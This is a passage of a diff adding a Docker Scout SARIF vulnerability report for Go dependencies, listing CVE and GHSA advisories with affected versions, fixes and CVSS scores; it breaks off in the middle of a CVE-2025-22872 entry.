@@ -1,0 +1,1963 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "fullName": "Docker Scout",
+          "informationUri": "https://docker.com/products/docker-scout",
+          "name": "docker scout",
+          "rules": [
+            {
+              "id": "CVE-2024-51744",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-51744: Improper Verification of Cryptographic Signature"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-51744?s=github&n=v4&ns=github.com%2Fgolang-jwt%2Fjwt&t=golang&vr=%3C4.5.1",
+              "help": {
+                "text": "### Summary\n\nUnclear documentation of the error behavior in `ParseWithClaims` can lead to situation where users are potentially not checking errors in the way they should be. Especially, if a token is both expired and invalid, the errors returned by `ParseWithClaims` return both error codes. If users only check for the `jwt.ErrTokenExpired ` using `error.Is`, they will ignore the embedded `jwt.ErrTokenSignatureInvalid` and thus potentially accept invalid tokens.\n\n### Fix\n\nWe have back-ported the error handling logic from the `v5` branch to the `v4` branch. In this logic, the `ParseWithClaims` function will immediately return in \"dangerous\" situations (e.g., an invalid signature), limiting the combined errors only to situations where the signature is valid, but further validation failed (e.g., if the signature is valid, but is expired AND has the wrong audience). This fix is part of the 4.5.1 release.\n\n### Workaround \n\nWe are aware that this changes the behaviour of an established function and is not 100 % backwards compatible, so updating to 4.5.1 might break your code. In case you cannot update to 4.5.0, please make sure that you are properly checking for all errors (\"dangerous\" ones first), so that you are not running in the case detailed above.\n\n```Go\ntoken, err := /* jwt.Parse or similar */\nif token.Valid {\n\tfmt.Println(\"You look nice today\")\n} else if errors.Is(err, jwt.ErrTokenMalformed) {\n\tfmt.Println(\"That's not even a token\")\n} else if errors.Is(err, jwt.ErrTokenUnverifiable) {\n\tfmt.Println(\"We could not verify this token\")\n} else if errors.Is(err, jwt.ErrTokenSignatureInvalid) {\n\tfmt.Println(\"This token has an invalid signature\")\n} else if errors.Is(err, jwt.ErrTokenExpired) || errors.Is(err, jwt.ErrTokenNotValidYet) {\n\t// Token is either expired or not active yet\n\tfmt.Println(\"Timing is everything\")\n} else {\n\tfmt.Println(\"Couldn't handle this token:\", err)\n}\n```\n",
+                "markdown": "> ### Summary\n\nUnclear documentation of the error behavior in `ParseWithClaims` can lead to situation where users are potentially not checking errors in the way they should be. Especially, if a token is both expired and invalid, the errors returned by `ParseWithClaims` return both error codes. If users only check for the `jwt.ErrTokenExpired ` using `error.Is`, they will ignore the embedded `jwt.ErrTokenSignatureInvalid` and thus potentially accept invalid tokens.\n\n### Fix\n\nWe have back-ported the error handling logic from the `v5` branch to the `v4` branch. In this logic, the `ParseWithClaims` function will immediately return in \"dangerous\" situations (e.g., an invalid signature), limiting the combined errors only to situations where the signature is valid, but further validation failed (e.g., if the signature is valid, but is expired AND has the wrong audience). This fix is part of the 4.5.1 release.\n\n### Workaround \n\nWe are aware that this changes the behaviour of an established function and is not 100 % backwards compatible, so updating to 4.5.1 might break your code. In case you cannot update to 4.5.0, please make sure that you are properly checking for all errors (\"dangerous\" ones first), so that you are not running in the case detailed above.\n\n```Go\ntoken, err := /* jwt.Parse or similar */\nif token.Valid {\n\tfmt.Println(\"You look nice today\")\n} else if errors.Is(err, jwt.ErrTokenMalformed) {\n\tfmt.Println(\"That's not even a token\")\n} else if errors.Is(err, jwt.ErrTokenUnverifiable) {\n\tfmt.Println(\"We could not verify this token\")\n} else if errors.Is(err, jwt.ErrTokenSignatureInvalid) {\n\tfmt.Println(\"This token has an invalid signature\")\n} else if errors.Is(err, jwt.ErrTokenExpired) || errors.Is(err, jwt.ErrTokenNotValidYet) {\n\t// Token is either expired or not active yet\n\tfmt.Println(\"Timing is everything\")\n} else {\n\tfmt.Println(\"Couldn't handle this token:\", err)\n}\n```\n\n|                |                                                                 |\n|----------------|-----------------------------------------------------------------|\n| Package        | pkg:golang/github.com/golang-jwt/jwt@4.5.0#v4                   |\n| Affected range | <4.5.1                                                          |\n| Fixed version  | 4.5.1                                                           |\n| CVSS Score     |                                                             2.3 |\n| CVSS Vector    | CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N |\n"
+              },
+              "properties": {
+                "affected_version": "<4.5.1",
+                "cvssV3": 2.3,
+                "cvssV3_severity": "LOW",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+                "fixed_version": "4.5.1",
+                "purls": [
+                  "pkg:golang/github.com/golang-jwt/jwt@4.5.0#v4"
+                ],
+                "security-severity": "2.3",
+                "tags": [
+                  "LOW"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-54410",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-54410: Missing Initialization of Resource"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-54410?s=github&n=docker&ns=github.com%2Fdocker&t=golang&vr=%3C%3D25.0.12",
+              "help": {
+                "text": "Moby is an open source container framework developed by Docker Inc. that is distributed as Docker Engine, Mirantis Container Runtime, and various other downstream projects/products. The Moby daemon component (dockerd), which is developed as [moby/moby](https://github.com/moby/moby) is commonly referred to as Docker, or Docker Engine.\n\nFirewalld is a daemon used by some Linux distributions to provide a dynamically managed firewall. When Firewalld is running, Docker uses its iptables backend to create rules, including rules to isolate containers in one bridge network from containers in other bridge networks.\n\n### Impact\n\nThe iptables rules created by Docker are removed when firewalld is reloaded using, for example \"firewall-cmd --reload\", \"killall -HUP firewalld\", or \"systemctl reload firewalld\".\n\nWhen that happens, Docker must re-create the rules. However, in affected versions of Docker, the iptables rules that isolate containers in different bridge networks from each other are not re-created.\n\nOnce these rules have been removed, containers have access to any port, on any container, in any non-internal bridge network, running on the Docker host.\n\nContainers running in networks created with `--internal` or equivalent have no access to other networks. Containers that are only connected to these networks remain isolated after a firewalld reload.\n\nWhere Docker Engine is not running in the host's network namespace, it is unaffected. Including, for example, Rootless Mode, and Docker Desktop.\n\n### Patches\n\nMoby releases 28.0.0 and newer are not affected. A fix is available in moby release 25.0.13.\n\n### Workarounds\nAfter reloading firewalld, either:\n- Restart the docker daemon,\n- Re-create bridge networks, or\n- Use rootless mode.\n\n### References\nhttps://firewalld.org/\nhttps://firewalld.org/documentation/howto/reload-firewalld.html\n",
+                "markdown": "> Moby is an open source container framework developed by Docker Inc. that is distributed as Docker Engine, Mirantis Container Runtime, and various other downstream projects/products. The Moby daemon component (dockerd), which is developed as [moby/moby](https://github.com/moby/moby) is commonly referred to as Docker, or Docker Engine.\n\nFirewalld is a daemon used by some Linux distributions to provide a dynamically managed firewall. When Firewalld is running, Docker uses its iptables backend to create rules, including rules to isolate containers in one bridge network from containers in other bridge networks.\n\n### Impact\n\nThe iptables rules created by Docker are removed when firewalld is reloaded using, for example \"firewall-cmd --reload\", \"killall -HUP firewalld\", or \"systemctl reload firewalld\".\n\nWhen that happens, Docker must re-create the rules. However, in affected versions of Docker, the iptables rules that isolate containers in different bridge networks from each other are not re-created.\n\nOnce these rules have been removed, containers have access to any port, on any container, in any non-internal bridge network, running on the Docker host.\n\nContainers running in networks created with `--internal` or equivalent have no access to other networks. Containers that are only connected to these networks remain isolated after a firewalld reload.\n\nWhere Docker Engine is not running in the host's network namespace, it is unaffected. Including, for example, Rootless Mode, and Docker Desktop.\n\n### Patches\n\nMoby releases 28.0.0 and newer are not affected. A fix is available in moby release 25.0.13.\n\n### Workarounds\nAfter reloading firewalld, either:\n- Restart the docker daemon,\n- Re-create bridge networks, or\n- Use rootless mode.\n\n### References\nhttps://firewalld.org/\nhttps://firewalld.org/documentation/howto/reload-firewalld.html\n\n|                |                                                           |\n|----------------|-----------------------------------------------------------|\n| Package        | pkg:golang/github.com/docker/docker@24.0.0%2Bincompatible |\n| Affected range | <=25.0.12                                                 |\n| Fixed version  | not fixed                                                 |\n| CVSS Score     |                                                       3.3 |\n| CVSS Vector    | CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N              |\n"
+              },
+              "properties": {
+                "affected_version": "<=25.0.12",
+                "cvssV3": 3.3,
+                "cvssV3_severity": "LOW",
+                "cvssV3_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N",
+                "fixed_version": "not fixed",
+                "purls": [
+                  "pkg:golang/github.com/docker/docker@24.0.0%2Bincompatible"
+                ],
+                "security-severity": "3.3",
+                "tags": [
+                  "LOW"
+                ]
+              }
+            },
+            {
+              "id": "GHSA-2c7c-3mj9-8fqh",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "GHSA-2c7c-3mj9-8fqh: Uncontrolled Resource Consumption"
+              },
+              "helpUri": "https://scout.docker.com/v/GHSA-2c7c-3mj9-8fqh?s=github&n=v3&ns=github.com%2Fgo-jose%2Fgo-jose&t=golang&vr=%3C3.0.1",
+              "help": {
+                "text": "The go-jose package is subject to a \"billion hashes attack\" causing denial-of-service when decrypting JWE inputs. This occurs when an attacker can provide a PBES2 encrypted JWE blob with a very large p2c value that, when decrypted, produces a denial-of-service.\n",
+                "markdown": "> The go-jose package is subject to a \"billion hashes attack\" causing denial-of-service when decrypting JWE inputs. This occurs when an attacker can provide a PBES2 encrypted JWE blob with a very large p2c value that, when decrypted, produces a denial-of-service.\n\n|                |                                                |\n|----------------|------------------------------------------------|\n| Package        | pkg:golang/github.com/go-jose/go-jose@3.0.0#v3 |\n| Affected range | <3.0.1                                         |\n| Fixed version  | 3.0.1                                          |\n"
+              },
+              "properties": {
+                "affected_version": "<3.0.1",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "3.0.1",
+                "purls": [
+                  "pkg:golang/github.com/go-jose/go-jose@3.0.0#v3"
+                ],
+                "security-severity": "4.1",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "GHSA-jq35-85cj-fj4p",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "GHSA-jq35-85cj-fj4p"
+              },
+              "helpUri": "https://scout.docker.com/v/GHSA-jq35-85cj-fj4p?s=github&n=docker&ns=github.com%2Fdocker&t=golang&vr=%3E%3D24.0.0%2C%3C24.0.7",
+              "help": {
+                "text": "Intel's RAPL (Running Average Power Limit) feature, introduced by the Sandy Bridge microarchitecture, provides software insights into hardware energy consumption. To facilitate this, Intel introduced the powercap framework in Linux kernel 3.13, which reads values via relevant MSRs (model specific registers) and provides unprivileged userspace access via `sysfs`. As RAPL is an interface to access a hardware feature, it is only available when running on bare metal with the module compiled into the kernel.\n\nBy 2019, it was realized that in some cases unprivileged access to RAPL readings could be exploited as a power-based side-channel against security features including AES-NI (potentially inside a SGX enclave) and KASLR (kernel address space layout randomization). Also known as the [PLATYPUS attack](https://platypusattack.com/), Intel assigned [CVE-2020-8694](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8694) and [CVE-2020-8695](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8695), and AMD assigned [CVE-2020-12912](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12912).\n\nSeveral mitigations were applied; Intel reduced the sampling resolution via a microcode update, and the Linux kernel [prevents access by non-root users](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71) since 5.10. However, this kernel-based mitigation does not apply to many container-based scenarios:\n* Unless using user namespaces, root inside a container has the same level of privilege as root outside the container, but with a slightly more narrow view of the system\n* `sysfs` is mounted inside containers read-only; however only read access is needed to carry out this attack on an unpatched CPU\n\nWhile this is not a direct vulnerability in container runtimes, defense in depth and safe defaults are valuable and preferred, especially as this poses a risk to multi-tenant container environments running directly on affected hardware. This is provided by masking `/sys/devices/virtual/powercap` in the default mount configuration, and adding an additional set of rules to deny it in the default AppArmor profile.\n\nWhile `sysfs` is not the only way to read from the RAPL subsystem, other ways of accessing it require additional capabilities such as `CAP_SYS_RAWIO` which is not available to containers by default, or `perf` paranoia level less than 1, which is a non-default kernel tunable.\n\n## References\n\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8694\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8695\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12912\n* https://platypusattack.com/\n* https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71\n* https://web.eece.maine.edu/~vweaver/projects/rapl/\n",
+                "markdown": "> Intel's RAPL (Running Average Power Limit) feature, introduced by the Sandy Bridge microarchitecture, provides software insights into hardware energy consumption. To facilitate this, Intel introduced the powercap framework in Linux kernel 3.13, which reads values via relevant MSRs (model specific registers) and provides unprivileged userspace access via `sysfs`. As RAPL is an interface to access a hardware feature, it is only available when running on bare metal with the module compiled into the kernel.\n\nBy 2019, it was realized that in some cases unprivileged access to RAPL readings could be exploited as a power-based side-channel against security features including AES-NI (potentially inside a SGX enclave) and KASLR (kernel address space layout randomization). Also known as the [PLATYPUS attack](https://platypusattack.com/), Intel assigned [CVE-2020-8694](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8694) and [CVE-2020-8695](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8695), and AMD assigned [CVE-2020-12912](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12912).\n\nSeveral mitigations were applied; Intel reduced the sampling resolution via a microcode update, and the Linux kernel [prevents access by non-root users](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71) since 5.10. However, this kernel-based mitigation does not apply to many container-based scenarios:\n* Unless using user namespaces, root inside a container has the same level of privilege as root outside the container, but with a slightly more narrow view of the system\n* `sysfs` is mounted inside containers read-only; however only read access is needed to carry out this attack on an unpatched CPU\n\nWhile this is not a direct vulnerability in container runtimes, defense in depth and safe defaults are valuable and preferred, especially as this poses a risk to multi-tenant container environments running directly on affected hardware. This is provided by masking `/sys/devices/virtual/powercap` in the default mount configuration, and adding an additional set of rules to deny it in the default AppArmor profile.\n\nWhile `sysfs` is not the only way to read from the RAPL subsystem, other ways of accessing it require additional capabilities such as `CAP_SYS_RAWIO` which is not available to containers by default, or `perf` paranoia level less than 1, which is a non-default kernel tunable.\n\n## References\n\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8694\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8695\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12912\n* https://platypusattack.com/\n* https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71\n* https://web.eece.maine.edu/~vweaver/projects/rapl/\n\n|                |                                                           |\n|----------------|-----------------------------------------------------------|\n| Package        | pkg:golang/github.com/docker/docker@24.0.0%2Bincompatible |\n| Affected range | >=24.0.0,<24.0.7                                          |\n| Fixed version  | 24.0.7                                                    |\n"
+              },
+              "properties": {
+                "affected_version": ">=24.0.0,<24.0.7",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "24.0.7",
+                "purls": [
+                  "pkg:golang/github.com/docker/docker@24.0.0%2Bincompatible"
+                ],
+                "security-severity": "4.1",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-22866",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-22866"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-22866?s=golang&n=stdlib&t=golang&vr=%3C1.22.12",
+              "help": {
+                "text": "Due to the usage of a variable time instruction in the assembly implementation of an internal function, a small number of bits of secret scalars are leaked on the ppc64le architecture. Due to the way this function is used, we do not believe this leakage is enough to allow recovery of the private key when P-256 is used in any well known protocols.\n",
+                "markdown": "> Due to the usage of a variable time instruction in the assembly implementation of an internal function, a small number of bits of secret scalars are leaked on the ppc64le architecture. Due to the way this function is used, we do not believe this leakage is enough to allow recovery of the private key when P-256 is used in any well known protocols.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.22.12                 |\n| Fixed version  | 1.22.12                  |\n"
+              },
+              "properties": {
+                "affected_version": "<1.22.12",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.22.12",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "4.0",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-45289",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2023-45289"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2023-45289?s=golang&n=stdlib&t=golang&vr=%3C1.21.8",
+              "help": {
+                "text": "When following an HTTP redirect to a domain which is not a subdomain match or exact match of the initial domain, an http.Client does not forward sensitive headers such as \"Authorization\" or \"Cookie\". For example, a redirect from foo.com to www.foo.com will forward the Authorization header, but a redirect to bar.com will not.\n\nA maliciously crafted HTTP redirect could cause sensitive headers to be unexpectedly forwarded.\n",
+                "markdown": "> When following an HTTP redirect to a domain which is not a subdomain match or exact match of the initial domain, an http.Client does not forward sensitive headers such as \"Authorization\" or \"Cookie\". For example, a redirect from foo.com to www.foo.com will forward the Authorization header, but a redirect to bar.com will not.\n\nA maliciously crafted HTTP redirect could cause sensitive headers to be unexpectedly forwarded.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.21.8                  |\n| Fixed version  | 1.21.8                   |\n"
+              },
+              "properties": {
+                "affected_version": "<1.21.8",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.21.8",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "4.3",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-28180",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-28180: Improper Handling of Highly Compressed Data (Data Amplification)"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-28180?s=github&n=v3&ns=github.com%2Fgo-jose%2Fgo-jose&t=golang&vr=%3C3.0.3",
+              "help": {
+                "text": "### Impact\nAn attacker could send a JWE containing compressed data that used large amounts of memory and CPU when decompressed by Decrypt or DecryptMulti. Those functions now return an error if the decompressed data would exceed 250kB or 10x the compressed size (whichever is larger). Thanks to Enze Wang@Alioth and Jianjun Chen@Zhongguancun Lab (@zer0yu and @chenjj) for reporting.\n\n### Patches\nThe problem is fixed in the following packages and versions:\n- github.com/go-jose/go-jose/v4 version 4.0.1\n- github.com/go-jose/go-jose/v3 version 3.0.3\n- gopkg.in/go-jose/go-jose.v2 version 2.6.3\n\nThe problem will not be fixed in the following package because the package is archived:\n- gopkg.in/square/go-jose.v2\n",
+                "markdown": "> ### Impact\nAn attacker could send a JWE containing compressed data that used large amounts of memory and CPU when decompressed by Decrypt or DecryptMulti. Those functions now return an error if the decompressed data would exceed 250kB or 10x the compressed size (whichever is larger). Thanks to Enze Wang@Alioth and Jianjun Chen@Zhongguancun Lab (@zer0yu and @chenjj) for reporting.\n\n### Patches\nThe problem is fixed in the following packages and versions:\n- github.com/go-jose/go-jose/v4 version 4.0.1\n- github.com/go-jose/go-jose/v3 version 3.0.3\n- gopkg.in/go-jose/go-jose.v2 version 2.6.3\n\nThe problem will not be fixed in the following package because the package is archived:\n- gopkg.in/square/go-jose.v2\n\n|                |                                                |\n|----------------|------------------------------------------------|\n| Package        | pkg:golang/github.com/go-jose/go-jose@3.0.0#v3 |\n| Affected range | <3.0.3                                         |\n| Fixed version  | 3.0.3                                          |\n| CVSS Score     |                                            4.3 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L   |\n"
+              },
+              "properties": {
+                "affected_version": "<3.0.3",
+                "cvssV3": 4.3,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L",
+                "fixed_version": "3.0.3",
+                "purls": [
+                  "pkg:golang/github.com/go-jose/go-jose@3.0.0#v3"
+                ],
+                "security-severity": "4.3",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-34155",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-34155"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-34155?s=golang&n=stdlib&t=golang&vr=%3C1.22.7",
+              "help": {
+                "text": "Calling any of the Parse functions on Go source code which contains deeply nested literals can cause a panic due to stack exhaustion.\n",
+                "markdown": "> Calling any of the Parse functions on Go source code which contains deeply nested literals can cause a panic due to stack exhaustion.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.22.7                  |\n| Fixed version  | 1.22.7                   |\n"
+              },
+              "properties": {
+                "affected_version": "<1.22.7",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.22.7",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "4.3",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-22870",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-22870: Misinterpretation of Input"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-22870?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.36.0",
+              "help": {
+                "text": "Matching of hosts against proxy patterns can improperly treat an IPv6 zone ID as a hostname component. For example, when the NO_PROXY environment variable is set to \"*.example.com\", a request to \"[::1%25.example.com]:80` will incorrectly match and not be proxied.\n",
+                "markdown": "> Matching of hosts against proxy patterns can improperly treat an IPv6 zone ID as a hostname component. For example, when the NO_PROXY environment variable is set to \"*.example.com\", a request to \"[::1%25.example.com]:80` will incorrectly match and not be proxied.\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:golang/golang.org/x/net@0.17.0           |\n| Affected range | <0.36.0                                      |\n| Fixed version  | 0.36.0                                       |\n| CVSS Score     |                                          4.4 |\n| CVSS Vector    | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L |\n"
+              },
+              "properties": {
+                "affected_version": "<0.36.0",
+                "cvssV3": 4.4,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L",
+                "fixed_version": "0.36.0",
+                "purls": [
+                  "pkg:golang/golang.org/x/net@0.17.0"
+                ],
+                "security-severity": "4.4",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-39326",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2023-39326"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2023-39326?s=golang&n=stdlib&t=golang&vr=%3E%3D1.21.0-0%2C%3C1.21.5",
+              "help": {
+                "text": "A malicious HTTP sender can use chunk extensions to cause a receiver reading from a request or response body to read many more bytes from the network than are in the body.\n\nA malicious HTTP client can further exploit this to cause a server to automatically read a large amount of data (up to about 1GiB) when a handler fails to read the entire body of a request.\n\nChunk extensions are a little-used HTTP feature which permit including additional metadata in a request or response body sent using the chunked encoding. The net/http chunked encoding reader discards this metadata. A sender can exploit this by inserting a large metadata segment with each byte transferred. The chunk reader now produces an error if the ratio of real body to encoded bytes grows too small.\n",
+                "markdown": "> A malicious HTTP sender can use chunk extensions to cause a receiver reading from a request or response body to read many more bytes from the network than are in the body.\n\nA malicious HTTP client can further exploit this to cause a server to automatically read a large amount of data (up to about 1GiB) when a handler fails to read the entire body of a request.\n\nChunk extensions are a little-used HTTP feature which permit including additional metadata in a request or response body sent using the chunked encoding. The net/http chunked encoding reader discards this metadata. A sender can exploit this by inserting a large metadata segment with each byte transferred. The chunk reader now produces an error if the ratio of real body to encoded bytes grows too small.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | >=1.21.0-0,<1.21.5       |\n| Fixed version  | 1.21.5                   |\n"
+              },
+              "properties": {
+                "affected_version": ">=1.21.0-0,<1.21.5",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.21.5",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "5.3",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-45284",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2023-45284"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2023-45284?s=golang&n=stdlib&t=golang&vr=%3E%3D1.21.0-0%2C%3C1.21.4",
+              "help": {
+                "text": "On Windows, The IsLocal function does not correctly detect reserved device names in some cases.\n\nReserved names followed by spaces, such as \"COM1 \", and reserved names \"COM\" and \"LPT\" followed by superscript 1, 2, or 3, are incorrectly reported as local.\n\nWith fix, IsLocal now correctly reports these names as non-local.\n",
+                "markdown": "> On Windows, The IsLocal function does not correctly detect reserved device names in some cases.\n\nReserved names followed by spaces, such as \"COM1 \", and reserved names \"COM\" and \"LPT\" followed by superscript 1, 2, or 3, are incorrectly reported as local.\n\nWith fix, IsLocal now correctly reports these names as non-local.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | >=1.21.0-0,<1.21.4       |\n| Fixed version  | 1.21.4                   |\n"
+              },
+              "properties": {
+                "affected_version": ">=1.21.0-0,<1.21.4",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.21.4",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "5.3",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-45288",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2023-45288"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2023-45288?s=golang&n=stdlib&t=golang&vr=%3C1.21.9",
+              "help": {
+                "text": "An attacker may cause an HTTP/2 endpoint to read arbitrary amounts of header data by sending an excessive number of CONTINUATION frames.\n\nMaintaining HPACK state requires parsing and processing all HEADERS and CONTINUATION frames on a connection. When a request's headers exceed MaxHeaderBytes, no memory is allocated to store the excess headers, but they are still parsed.\n\nThis permits an attacker to cause an HTTP/2 endpoint to read arbitrary amounts of header data, all associated with a request which is going to be rejected. These headers can include Huffman-encoded data which is significantly more expensive for the receiver to decode than for an attacker to send.\n\nThe fix sets a limit on the amount of excess header frames we will process before closing a connection.\n",
+                "markdown": "> An attacker may cause an HTTP/2 endpoint to read arbitrary amounts of header data by sending an excessive number of CONTINUATION frames.\n\nMaintaining HPACK state requires parsing and processing all HEADERS and CONTINUATION frames on a connection. When a request's headers exceed MaxHeaderBytes, no memory is allocated to store the excess headers, but they are still parsed.\n\nThis permits an attacker to cause an HTTP/2 endpoint to read arbitrary amounts of header data, all associated with a request which is going to be rejected. These headers can include Huffman-encoded data which is significantly more expensive for the receiver to decode than for an attacker to send.\n\nThe fix sets a limit on the amount of excess header frames we will process before closing a connection.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.21.9                  |\n| Fixed version  | 1.21.9                   |\n"
+              },
+              "properties": {
+                "affected_version": "<0.23.0",
+                "cvssV3": 5.3,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                "fixed_version": "0.23.0",
+                "purls": [
+                  "pkg:golang/golang.org/x/net@0.17.0",
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "5.3",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-45338",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-45338"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-45338?s=golang&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.33.0",
+              "help": {
+                "text": "An attacker can craft an input to the Parse functions that would be processed non-linearly with respect to its length, resulting in extremely slow parsing. This could cause a denial of service.\n",
+                "markdown": "> An attacker can craft an input to the Parse functions that would be processed non-linearly with respect to its length, resulting in extremely slow parsing. This could cause a denial of service.\n\n|                |                                    |\n|----------------|------------------------------------|\n| Package        | pkg:golang/golang.org/x/net@0.17.0 |\n| Affected range | <0.33.0                            |\n| Fixed version  | 0.33.0                             |\n"
+              },
+              "properties": {
+                "affected_version": "<0.33.0",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "0.33.0",
+                "purls": [
+                  "pkg:golang/golang.org/x/net@0.17.0"
+                ],
+                "security-severity": "5.3",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-22872",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-22872: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-22872?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.38.0",
+              "help": {
